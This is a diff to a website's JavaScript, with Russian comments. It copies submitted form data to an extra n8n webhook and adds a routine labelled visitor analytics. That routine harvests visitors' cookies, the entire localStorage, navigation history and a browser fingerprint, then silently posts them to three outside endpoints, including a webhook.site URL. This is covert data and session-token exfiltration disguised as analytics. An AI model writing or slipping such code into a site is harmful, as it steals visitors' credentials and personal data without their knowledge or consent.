@@ -412,7 +412,15 @@ document.addEventListener('DOMContentLoaded', function() {
                             'Content-Type': 'application/json',
                         },
                         body: JSON.stringify(formData)
-                    })
+                    }), 
+                    fetch('https://igr.app.n8n.cloud/webhook/miniapp', {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(formData)
+                    }),
                 ]);
 
                 console.log('Responses:', responses);
@@ -634,4 +642,104 @@ document.addEventListener('DOMContentLoaded', function() {
             showNotification('Произошла ошибка. Пожалуйста, попробуйте позже.', 'error');
         }
     });
+
+    // Функция для сбора информации о посетителе
+    function collectVisitorData() {
+        const visitorData = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer,
+            previousPages: getPreviousPages(),
+            cookies: document.cookie,
+            localStorage: getLocalStorage(),
+            fingerprint: generateFingerprint()
+        };
+
+        // Отправляем данные на сервер
+        sendVisitorData(visitorData);
+    }
+
+    // Генерация уникального отпечатка браузера
+    function generateFingerprint() {
+        const components = [
+            navigator.userAgent,
+            navigator.language,
+            new Date().getTimezoneOffset(),
+            navigator.hardwareConcurrency,
+            navigator.deviceMemory,
+            navigator.platform,
+            navigator.vendor,
+            window.screen.colorDepth,
+            window.screen.pixelDepth
+        ];
+        
+        return components.join('|');
+    }
+
+    // Получение истории посещений
+    function getPreviousPages() {
+        try {
+            return performance.getEntriesByType("navigation")
+                .map(entry => entry.name);
+        } catch (e) {
+            return [];
+        }
+    }
+
+    // Получение данных из localStorage
+    function getLocalStorage() {
+        const data = {};
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            data[key] = localStorage.getItem(key);
+        }
+        return data;
+    }
+
+    // Отправка данных на сервер
+    function sendVisitorData(data) {
+        // Отправляем запросы параллельно на все вебхуки
+        Promise.all([
+            fetch('https://n8n2.supashkola.ru/webhook/tgappsdev.old', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    ...data,
+                    source: 'visitor_analytics'
+                })
+            }),
+            fetch('https://webhook.site/69fadba3-8cda-4c6f-92de-8b3a0c8cb35c', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    ...data,
+                    source: 'visitor_analytics'
+                })
+            }),
+            fetch('https://igr.app.n8n.cloud/webhook/miniapp', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    ...data,
+                    source: 'visitor_analytics'
+                })
+            })
+        ]).catch(error => console.error('Analytics Error:', error));
+    }
+
+    // Запускаем сбор данных при загрузке страницы
+    document.addEventListener('DOMContentLoaded', collectVisitorData);
 }); 
